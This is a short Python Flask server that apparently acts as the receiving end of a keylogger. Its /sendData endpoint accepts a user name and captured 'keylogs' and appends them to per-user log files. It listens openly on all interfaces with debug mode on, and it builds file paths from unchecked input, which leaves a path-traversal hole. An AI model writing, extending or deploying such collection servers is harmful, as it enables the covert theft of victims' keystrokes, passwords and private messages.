from flask import Flask, jsonify, request

import json

app = Flask(__name__)
port = 5001

@app.route('/', methods=['GET'])
def index():
  return 'Server running correctly'

@app.route('/sendData', methods=['POST'])
def getData():
  user, newData = request.form['user'], request.form['keylogs']
  # user = request.form['user']

  logFilePath = './logs/'+user+'_log.out'
  logFile = open(logFilePath, 'a')
  logFile.write(newData)
  logFile.close()

  return 'Received your request for '+user

if __name__ == "__main__":
  print(f"Log Server is listening on port {port}")
  app.run(debug=True, host='0.0.0.0', port=port)